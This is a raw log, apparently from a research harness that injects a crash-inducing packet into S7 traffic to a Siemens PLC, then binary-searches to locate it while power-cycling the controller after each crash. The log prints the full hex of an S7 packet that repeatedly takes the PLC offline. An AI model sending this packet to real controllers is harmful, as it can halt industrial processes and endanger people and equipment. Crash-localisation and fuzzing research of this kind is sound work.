[2021-11-22 18:58:02,094] [INFO] [MyS7Client.crushListen] -> start listen arp
[2021-11-22 18:58:02,094] [INFO] [valition.<module>] -> Will send 1000 packets, the crush packet is 30
[2021-11-22 18:58:02,095] [INFO] [MyS7Client.connect] -> Start connect PLC
[2021-11-22 18:58:02,138] [INFO] [MyS7Client.findArpPacket] -> passive detected a probable crush e0dca0439b86e0e1a91549c508060001080006040002e0e1a91549c5c0a80189e0dca0439b86c0a801bc
[2021-11-22 18:58:02,227] [INFO] [MyS7Client.send_receive_s7_packet] -> [Connect request]0300001902f08032010000010000080000f000000a000a00f0
[2021-11-22 18:58:02,228] [INFO] [MyS7Client.send_receive_s7_packet] -> [Connect responde]0300001b02f080320300000100000800000000f0000003000300f0
[2021-11-22 18:58:02,230] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700000200000800080001120411440100ff090004001c0000
[2021-11-22 18:58:02,434] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700000300000800080001120411440100ff090004001c0000
[2021-11-22 18:58:02,640] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700000400000800080001120411440100ff090004001c0000
[2021-11-22 18:58:02,843] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700000500000800080001120411440100ff090004001c0000
[2021-11-22 18:58:03,046] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700000600000800080001120411440100ff090004001c0000
[2021-11-22 18:58:03,248] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700000700000800080001120411440100ff090004001c0000
[2021-11-22 18:58:03,452] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700000800000800080001120411440100ff090004001c0000
[2021-11-22 18:58:03,656] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700000900000800080001120411440100ff090004001c0000
[2021-11-22 18:58:03,861] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700000a00000800080001120411440100ff090004001c0000
[2021-11-22 18:58:04,067] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700000b00000800080001120411440100ff090004001c0000
[2021-11-22 18:58:04,273] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700000c00000800080001120411440100ff090004001c0000
[2021-11-22 18:58:04,476] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700000d00000800080001120411440100ff090004001c0000
[2021-11-22 18:58:04,684] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700000e00000800080001120411440100ff090004001c0000
[2021-11-22 18:58:04,886] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700000f00000800080001120411440100ff090004001c0000
[2021-11-22 18:58:05,092] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700001000000800080001120411440100ff090004001c0000
[2021-11-22 18:58:05,297] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700001100000800080001120411440100ff090004001c0000
[2021-11-22 18:58:05,505] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700001200000800080001120411440100ff090004001c0000
[2021-11-22 18:58:05,712] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700001300000800080001120411440100ff090004001c0000
[2021-11-22 18:58:05,928] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700001400000800080001120411440100ff090004001c0000
[2021-11-22 18:58:06,133] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700001500000800080001120411440100ff090004001c0000
[2021-11-22 18:58:06,340] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700001600000800080001120411440100ff090004001c0000
[2021-11-22 18:58:06,546] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700001700000800080001120411440100ff090004001c0000
[2021-11-22 18:58:06,749] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700001800000800080001120411440100ff090004001c0000
[2021-11-22 18:58:06,954] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700001900000800080001120411440100ff090004001c0000
[2021-11-22 18:58:07,159] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700001a00000800080001120411440100ff090004001c0000
[2021-11-22 18:58:07,367] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700001b00000800080001120411440100ff090004001c0000
[2021-11-22 18:58:07,584] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700001c00000800080001120411440100ff090004001c0000
[2021-11-22 18:58:07,789] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700001d00000800080001120411440100ff090004001c0000
[2021-11-22 18:58:07,992] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700001e00000800080001120411440100ff090004001c0000
[2021-11-22 18:58:08,197] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700001f00000800080001120411440100ff090004001c0000
[2021-11-22 18:58:08,799] [INFO] [MyS7Client.send_s7_packet] -> Send the crush packet
[2021-11-22 18:58:08,800] [INFO] [MyS7Client.send_s7_packet] -> [request]0300001f02f080320100002000000e00000401120a10010003000083000001
[2021-11-22 18:58:09,002] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700002100000800080001120411440100ff090004001c0000
[2021-11-22 18:58:09,205] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700002200000800080001120411440100ff090004001c0000
[2021-11-22 18:58:09,408] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700002300000800080001120411440100ff090004001c0000
[2021-11-22 18:58:09,612] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700002400000800080001120411440100ff090004001c0000
[2021-11-22 18:58:09,815] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700002500000800080001120411440100ff090004001c0000
[2021-11-22 18:58:10,023] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700002600000800080001120411440100ff090004001c0000
[2021-11-22 18:58:10,230] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700002700000800080001120411440100ff090004001c0000
[2021-11-22 18:58:10,437] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700002800000800080001120411440100ff090004001c0000
[2021-11-22 18:58:10,641] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700002900000800080001120411440100ff090004001c0000
[2021-11-22 18:58:10,845] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700002a00000800080001120411440100ff090004001c0000
[2021-11-22 18:58:11,052] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700002b00000800080001120411440100ff090004001c0000
[2021-11-22 18:58:11,255] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700002c00000800080001120411440100ff090004001c0000
[2021-11-22 18:58:11,461] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700002d00000800080001120411440100ff090004001c0000
[2021-11-22 18:58:11,668] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700002e00000800080001120411440100ff090004001c0000
[2021-11-22 18:58:11,876] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700002f00000800080001120411440100ff090004001c0000
[2021-11-22 18:58:12,090] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700003000000800080001120411440100ff090004001c0000
[2021-11-22 18:58:12,296] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700003100000800080001120411440100ff090004001c0000
[2021-11-22 18:58:12,503] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700003200000800080001120411440100ff090004001c0000
[2021-11-22 18:58:12,709] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700003300000800080001120411440100ff090004001c0000
[2021-11-22 18:58:12,912] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700003400000800080001120411440100ff090004001c0000
[2021-11-22 18:58:13,118] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700003500000800080001120411440100ff090004001c0000
[2021-11-22 18:58:13,324] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700003600000800080001120411440100ff090004001c0000
[2021-11-22 18:58:13,530] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700003700000800080001120411440100ff090004001c0000
[2021-11-22 18:58:13,737] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700003800000800080001120411440100ff090004001c0000
[2021-11-22 18:58:13,955] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700003900000800080001120411440100ff090004001c0000
[2021-11-22 18:58:14,161] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700003a00000800080001120411440100ff090004001c0000
[2021-11-22 18:58:14,367] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700003b00000800080001120411440100ff090004001c0000
[2021-11-22 18:58:14,575] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700003c00000800080001120411440100ff090004001c0000
[2021-11-22 18:58:14,791] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700003d00000800080001120411440100ff090004001c0000
[2021-11-22 18:58:14,997] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700003e00000800080001120411440100ff090004001c0000
[2021-11-22 18:58:15,204] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700003f00000800080001120411440100ff090004001c0000
[2021-11-22 18:58:15,410] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700004000000800080001120411440100ff090004001c0000
[2021-11-22 18:58:15,614] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700004100000800080001120411440100ff090004001c0000
[2021-11-22 18:58:15,818] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700004200000800080001120411440100ff090004001c0000
[2021-11-22 18:58:16,022] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700004300000800080001120411440100ff090004001c0000
[2021-11-22 18:58:16,227] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700004400000800080001120411440100ff090004001c0000
[2021-11-22 18:58:16,290] [INFO] [MyS7Client.findArpPacket] -> passive detected a probable crush e0dca0439b86e0e1a91549c508060001080006040001e0e1a91549c5c0a80189e0dca0439b86c0a801bc
[2021-11-22 18:58:16,431] [INFO] [MyS7Client.onlinePLC] -> checking whether the PLC is online
[2021-11-22 18:58:18,459] [INFO] [MyS7Client.onlinePLC] -> the PLC is offline
[2021-11-22 18:58:18,460] [INFO] [valition.handleCrush] -> handling crush
[2021-11-22 18:58:18,462] [INFO] [valition.__closePlugin] -> trying to switch off the plugin
[2021-11-22 18:58:18,726] [INFO] [valition.__closePlugin] -> Switch off Plugin success!
[2021-11-22 18:58:20,728] [INFO] [valition.__openPlugin] -> trying to switch on the plugin
[2021-11-22 18:58:20,980] [INFO] [valition.__openPlugin] -> Switch on the Plugin success!
[2021-11-22 18:58:20,982] [INFO] [MyS7Client.onlinePLC] -> checking whether the PLC is online
[2021-11-22 18:58:29,011] [INFO] [MyS7Client.onlinePLC] -> the PLC is online
[2021-11-22 18:58:29,012] [INFO] [BLocate.locate] -> ****************Start binary search crush*************
[2021-11-22 18:58:29,012] [INFO] [BLocate.locate] -> chosenPacket from 0 to 20 ; leftPackets from 20 to 40.
[2021-11-22 18:58:29,013] [INFO] [MyS7Client.connect] -> Close old socket!
[2021-11-22 18:58:29,013] [INFO] [MyS7Client.connect] -> Start connect PLC
[2021-11-22 18:58:29,101] [INFO] [MyS7Client.send_receive_s7_packet] -> [Connect request]0300001902f08032010000450000080000f000000a000a00f0
[2021-11-22 18:58:29,102] [INFO] [MyS7Client.send_receive_s7_packet] -> [Connect responde]0300001b02f080320300004500000800000000f0000003000300f0
[2021-11-22 18:58:29,104] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700004600000800080001120411440100ff090004001c0000
[2021-11-22 18:58:29,106] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700004700000800080001120411440100ff090004001c0000
[2021-11-22 18:58:29,108] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700004800000800080001120411440100ff090004001c0000
[2021-11-22 18:58:29,506] [INFO] [MyS7Client.send_s7_packet] -> Send the crush packet
[2021-11-22 18:58:29,510] [INFO] [MyS7Client.send_s7_packet] -> [request]0300001f02f080320100004900000e00000401120a10010003000083000001
[2021-11-22 18:58:29,517] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700004a00000800080001120411440100ff090004001c0000
[2021-11-22 18:58:29,519] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700004b00000800080001120411440100ff090004001c0000
[2021-11-22 18:58:29,522] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700004c00000800080001120411440100ff090004001c0000
[2021-11-22 18:58:29,524] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700004d00000800080001120411440100ff090004001c0000
[2021-11-22 18:58:29,525] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700004e00000800080001120411440100ff090004001c0000
[2021-11-22 18:58:29,527] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700004f00000800080001120411440100ff090004001c0000
[2021-11-22 18:58:29,529] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700005000000800080001120411440100ff090004001c0000
[2021-11-22 18:58:29,530] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700005100000800080001120411440100ff090004001c0000
[2021-11-22 18:58:29,532] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700005200000800080001120411440100ff090004001c0000
[2021-11-22 18:58:29,534] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700005300000800080001120411440100ff090004001c0000
[2021-11-22 18:58:29,535] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700005400000800080001120411440100ff090004001c0000
[2021-11-22 18:58:29,538] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700005500000800080001120411440100ff090004001c0000
[2021-11-22 18:58:29,540] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700005600000800080001120411440100ff090004001c0000
[2021-11-22 18:58:29,542] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700005700000800080001120411440100ff090004001c0000
[2021-11-22 18:58:29,544] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700005800000800080001120411440100ff090004001c0000
[2021-11-22 18:58:29,546] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700005900000800080001120411440100ff090004001c0000
[2021-11-22 18:58:32,557] [INFO] [MyS7Client.onlinePLC] -> checking whether the PLC is online
[2021-11-22 18:58:34,583] [INFO] [MyS7Client.onlinePLC] -> the PLC is offline
[2021-11-22 18:58:34,583] [INFO] [BLocate.locate] -> find a crush
[2021-11-22 18:58:34,583] [INFO] [valition.handleCrush] -> handling crush
[2021-11-22 18:58:34,584] [INFO] [valition.__closePlugin] -> trying to switch off the plugin
[2021-11-22 18:58:34,892] [INFO] [valition.__closePlugin] -> Switch off Plugin success!
[2021-11-22 18:58:36,901] [INFO] [valition.__openPlugin] -> trying to switch on the plugin
[2021-11-22 18:58:37,177] [INFO] [valition.__openPlugin] -> Switch on the Plugin success!
[2021-11-22 18:58:37,178] [INFO] [MyS7Client.onlinePLC] -> checking whether the PLC is online
[2021-11-22 18:58:49,237] [INFO] [MyS7Client.onlinePLC] -> the PLC is online
[2021-11-22 18:58:49,238] [INFO] [BLocate.locate] -> chosenPacket from 0 to 10 ; leftPackets from 10 to 20.
[2021-11-22 18:58:49,240] [INFO] [MyS7Client.connect] -> Close old socket!
[2021-11-22 18:58:49,241] [INFO] [MyS7Client.connect] -> Start connect PLC
[2021-11-22 18:58:49,274] [INFO] [MyS7Client.send_receive_s7_packet] -> [Connect request]0300001902f080320100005a0000080000f000000a000a00f0
[2021-11-22 18:58:49,275] [INFO] [MyS7Client.send_receive_s7_packet] -> [Connect responde]0300001b02f080320300005a00000800000000f0000003000300f0
[2021-11-22 18:58:49,276] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700005b00000800080001120411440100ff090004001c0000
[2021-11-22 18:58:49,278] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700005c00000800080001120411440100ff090004001c0000
[2021-11-22 18:58:49,279] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700005d00000800080001120411440100ff090004001c0000
[2021-11-22 18:58:49,626] [INFO] [MyS7Client.send_s7_packet] -> Send the crush packet
[2021-11-22 18:58:49,630] [INFO] [MyS7Client.send_s7_packet] -> [request]0300001f02f080320100005e00000e00000401120a10010003000083000001
[2021-11-22 18:58:49,637] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700005f00000800080001120411440100ff090004001c0000
[2021-11-22 18:58:49,640] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700006000000800080001120411440100ff090004001c0000
[2021-11-22 18:58:49,642] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700006100000800080001120411440100ff090004001c0000
[2021-11-22 18:58:49,644] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700006200000800080001120411440100ff090004001c0000
[2021-11-22 18:58:49,646] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700006300000800080001120411440100ff090004001c0000
[2021-11-22 18:58:49,647] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700006400000800080001120411440100ff090004001c0000
[2021-11-22 18:58:52,662] [INFO] [MyS7Client.onlinePLC] -> checking whether the PLC is online
[2021-11-22 18:58:54,687] [INFO] [MyS7Client.onlinePLC] -> the PLC is offline
[2021-11-22 18:58:54,687] [INFO] [BLocate.locate] -> find a crush
[2021-11-22 18:58:54,688] [INFO] [valition.handleCrush] -> handling crush
[2021-11-22 18:58:54,688] [INFO] [valition.__closePlugin] -> trying to switch off the plugin
[2021-11-22 18:58:55,041] [INFO] [valition.__closePlugin] -> Switch off Plugin success!
[2021-11-22 18:58:57,055] [INFO] [valition.__openPlugin] -> trying to switch on the plugin
[2021-11-22 18:58:57,334] [INFO] [valition.__openPlugin] -> Switch on the Plugin success!
[2021-11-22 18:58:57,335] [INFO] [MyS7Client.onlinePLC] -> checking whether the PLC is online
[2021-11-22 18:59:05,356] [INFO] [MyS7Client.onlinePLC] -> the PLC is online
[2021-11-22 18:59:05,356] [INFO] [BLocate.locate] -> chosenPacket from 0 to 5 ; leftPackets from 5 to 10.
[2021-11-22 18:59:05,357] [INFO] [MyS7Client.connect] -> Close old socket!
[2021-11-22 18:59:05,357] [INFO] [MyS7Client.connect] -> Start connect PLC
[2021-11-22 18:59:05,423] [INFO] [MyS7Client.send_receive_s7_packet] -> [Connect request]0300001902f08032010000650000080000f000000a000a00f0
[2021-11-22 18:59:05,423] [INFO] [MyS7Client.send_receive_s7_packet] -> [Connect responde]0300001b02f080320300006500000800000000f0000003000300f0
[2021-11-22 18:59:05,426] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700006600000800080001120411440100ff090004001c0000
[2021-11-22 18:59:05,427] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700006700000800080001120411440100ff090004001c0000
[2021-11-22 18:59:05,429] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700006800000800080001120411440100ff090004001c0000
[2021-11-22 18:59:05,695] [INFO] [MyS7Client.send_s7_packet] -> Send the crush packet
[2021-11-22 18:59:05,696] [INFO] [MyS7Client.send_s7_packet] -> [request]0300001f02f080320100006900000e00000401120a10010003000083000001
[2021-11-22 18:59:05,697] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700006a00000800080001120411440100ff090004001c0000
[2021-11-22 18:59:08,710] [INFO] [MyS7Client.onlinePLC] -> checking whether the PLC is online
[2021-11-22 18:59:10,740] [INFO] [MyS7Client.onlinePLC] -> the PLC is offline
[2021-11-22 18:59:10,741] [INFO] [BLocate.locate] -> find a crush
[2021-11-22 18:59:10,742] [INFO] [valition.handleCrush] -> handling crush
[2021-11-22 18:59:10,742] [INFO] [valition.__closePlugin] -> trying to switch off the plugin
[2021-11-22 18:59:10,911] [INFO] [valition.__closePlugin] -> Switch off Plugin success!
[2021-11-22 18:59:12,916] [INFO] [valition.__openPlugin] -> trying to switch on the plugin
[2021-11-22 18:59:13,278] [INFO] [valition.__openPlugin] -> Switch on the Plugin success!
[2021-11-22 18:59:13,279] [INFO] [MyS7Client.onlinePLC] -> checking whether the PLC is online
[2021-11-22 18:59:21,316] [INFO] [MyS7Client.onlinePLC] -> the PLC is online
[2021-11-22 18:59:21,317] [INFO] [BLocate.locate] -> chosenPacket from 0 to 2 ; leftPackets from 2 to 5.
[2021-11-22 18:59:21,318] [INFO] [MyS7Client.connect] -> Close old socket!
[2021-11-22 18:59:21,319] [INFO] [MyS7Client.connect] -> Start connect PLC
[2021-11-22 18:59:21,399] [INFO] [MyS7Client.send_receive_s7_packet] -> [Connect request]0300001902f080320100006b0000080000f000000a000a00f0
[2021-11-22 18:59:21,401] [INFO] [MyS7Client.send_receive_s7_packet] -> [Connect responde]0300001b02f080320300006b00000800000000f0000003000300f0
[2021-11-22 18:59:21,408] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700006c00000800080001120411440100ff090004001c0000
[2021-11-22 18:59:21,410] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700006d00000800080001120411440100ff090004001c0000
[2021-11-22 18:59:24,418] [INFO] [MyS7Client.onlinePLC] -> checking whether the PLC is online
[2021-11-22 18:59:24,433] [INFO] [MyS7Client.onlinePLC] -> the PLC is online
[2021-11-22 18:59:24,433] [INFO] [BLocate.locate] -> chosenPacket from 0 to 1 ; leftPackets from 1 to 3.
[2021-11-22 18:59:24,434] [INFO] [MyS7Client.connect] -> Close old socket!
[2021-11-22 18:59:24,434] [INFO] [MyS7Client.connect] -> Start connect PLC
[2021-11-22 18:59:24,555] [INFO] [MyS7Client.send_receive_s7_packet] -> [Connect request]0300001902f080320100006e0000080000f000000a000a00f0
[2021-11-22 18:59:24,556] [INFO] [MyS7Client.send_receive_s7_packet] -> [Connect responde]0300001b02f080320300006e00000800000000f0000003000300f0
[2021-11-22 18:59:24,559] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700006f00000800080001120411440100ff090004001c0000
[2021-11-22 18:59:27,567] [INFO] [MyS7Client.onlinePLC] -> checking whether the PLC is online
[2021-11-22 18:59:27,582] [INFO] [MyS7Client.onlinePLC] -> the PLC is online
[2021-11-22 18:59:27,582] [INFO] [BLocate.locate] -> chosenPacket from 0 to 1 ; leftPackets from 1 to 2.
[2021-11-22 18:59:27,583] [INFO] [MyS7Client.connect] -> Close old socket!
[2021-11-22 18:59:27,583] [INFO] [MyS7Client.connect] -> Start connect PLC
[2021-11-22 18:59:27,658] [INFO] [MyS7Client.send_receive_s7_packet] -> [Connect request]0300001902f08032010000700000080000f000000a000a00f0
[2021-11-22 18:59:27,660] [INFO] [MyS7Client.send_receive_s7_packet] -> [Connect responde]0300001b02f080320300007000000800000000f0000003000300f0
[2021-11-22 18:59:28,094] [INFO] [MyS7Client.send_s7_packet] -> Send the crush packet
[2021-11-22 18:59:28,095] [INFO] [MyS7Client.send_s7_packet] -> [request]0300001f02f080320100007100000e00000401120a10010003000083000001
[2021-11-22 18:59:31,101] [INFO] [MyS7Client.onlinePLC] -> checking whether the PLC is online
[2021-11-22 18:59:33,128] [INFO] [MyS7Client.onlinePLC] -> the PLC is offline
[2021-11-22 18:59:33,128] [INFO] [BLocate.locate] -> find a crush
[2021-11-22 18:59:33,129] [INFO] [valition.handleCrush] -> handling crush
[2021-11-22 18:59:33,129] [INFO] [valition.__closePlugin] -> trying to switch off the plugin
[2021-11-22 18:59:33,421] [INFO] [valition.__closePlugin] -> Switch off Plugin success!
[2021-11-22 18:59:35,432] [INFO] [valition.__openPlugin] -> trying to switch on the plugin
[2021-11-22 18:59:35,780] [INFO] [valition.__openPlugin] -> Switch on the Plugin success!
[2021-11-22 18:59:35,780] [INFO] [MyS7Client.onlinePLC] -> checking whether the PLC is online
[2021-11-22 18:59:43,816] [INFO] [MyS7Client.onlinePLC] -> the PLC is online
[2021-11-22 18:59:43,817] [INFO] [BLocate.locate] -> Crush Packet is 0300001f02f080320100007100000e00000401120a10010003000083000001
[2021-11-22 18:59:43,818] [INFO] [valition.<module>] -> The true crush number is 30, the finded crush number is 30
[2021-11-22 18:59:43,818] [INFO] [valition.<module>] -> Will send 1000 packets, the crush packet is 188
[2021-11-22 18:59:43,819] [INFO] [MyS7Client.connect] -> Close old socket!
[2021-11-22 18:59:43,819] [INFO] [MyS7Client.connect] -> Start connect PLC
[2021-11-22 18:59:43,953] [INFO] [MyS7Client.send_receive_s7_packet] -> [Connect request]0300001902f08032010000720000080000f000000a000a00f0
[2021-11-22 18:59:43,954] [INFO] [MyS7Client.send_receive_s7_packet] -> [Connect responde]0300001b02f080320300007200000800000000f0000003000300f0
[2021-11-22 18:59:43,956] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700007300000800080001120411440100ff090004001c0000
[2021-11-22 18:59:43,961] [INFO] [MyS7Client.findArpPacket] -> passive detected a probable crush e0dca0439b86e0e1a91549c508060001080006040001e0e1a91549c5c0a80189e0dca0439b86c0a801bc
[2021-11-22 18:59:44,160] [INFO] [MyS7Client.onlinePLC] -> checking whether the PLC is online
[2021-11-22 18:59:44,168] [INFO] [MyS7Client.onlinePLC] -> the PLC is online
[2021-11-22 18:59:44,170] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700007400000800080001120411440100ff090004001c0000
[2021-11-22 18:59:44,382] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700007500000800080001120411440100ff090004001c0000
[2021-11-22 18:59:44,589] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700007600000800080001120411440100ff090004001c0000
[2021-11-22 18:59:44,795] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700007700000800080001120411440100ff090004001c0000
[2021-11-22 18:59:45,000] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700007800000800080001120411440100ff090004001c0000
[2021-11-22 18:59:45,204] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700007900000800080001120411440100ff090004001c0000
[2021-11-22 18:59:45,411] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700007a00000800080001120411440100ff090004001c0000
[2021-11-22 18:59:45,619] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700007b00000800080001120411440100ff090004001c0000
[2021-11-22 18:59:45,824] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700007c00000800080001120411440100ff090004001c0000
[2021-11-22 18:59:46,030] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700007d00000800080001120411440100ff090004001c0000
[2021-11-22 18:59:46,233] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700007e00000800080001120411440100ff090004001c0000
[2021-11-22 18:59:46,439] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700007f00000800080001120411440100ff090004001c0000
[2021-11-22 18:59:46,644] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700008000000800080001120411440100ff090004001c0000
[2021-11-22 18:59:46,849] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700008100000800080001120411440100ff090004001c0000
[2021-11-22 18:59:47,057] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700008200000800080001120411440100ff090004001c0000
[2021-11-22 18:59:47,261] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700008300000800080001120411440100ff090004001c0000
[2021-11-22 18:59:47,469] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700008400000800080001120411440100ff090004001c0000
[2021-11-22 18:59:47,674] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700008500000800080001120411440100ff090004001c0000
[2021-11-22 18:59:47,882] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700008600000800080001120411440100ff090004001c0000
[2021-11-22 18:59:48,085] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700008700000800080001120411440100ff090004001c0000
[2021-11-22 18:59:48,291] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700008800000800080001120411440100ff090004001c0000
[2021-11-22 18:59:48,495] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700008900000800080001120411440100ff090004001c0000
[2021-11-22 18:59:48,700] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700008a00000800080001120411440100ff090004001c0000
[2021-11-22 18:59:48,908] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700008b00000800080001120411440100ff090004001c0000
[2021-11-22 18:59:49,113] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700008c00000800080001120411440100ff090004001c0000
[2021-11-22 18:59:49,316] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700008d00000800080001120411440100ff090004001c0000
[2021-11-22 18:59:49,521] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700008e00000800080001120411440100ff090004001c0000
[2021-11-22 18:59:49,727] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700008f00000800080001120411440100ff090004001c0000
[2021-11-22 18:59:49,805] [INFO] [MyS7Client.findArpPacket] -> passive detected a probable crush e0dca0439b86e0e1a91549c508060001080006040001e0e1a91549c5c0a80189e0dca0439b86c0a801bc
[2021-11-22 18:59:49,929] [INFO] [MyS7Client.onlinePLC] -> checking whether the PLC is online
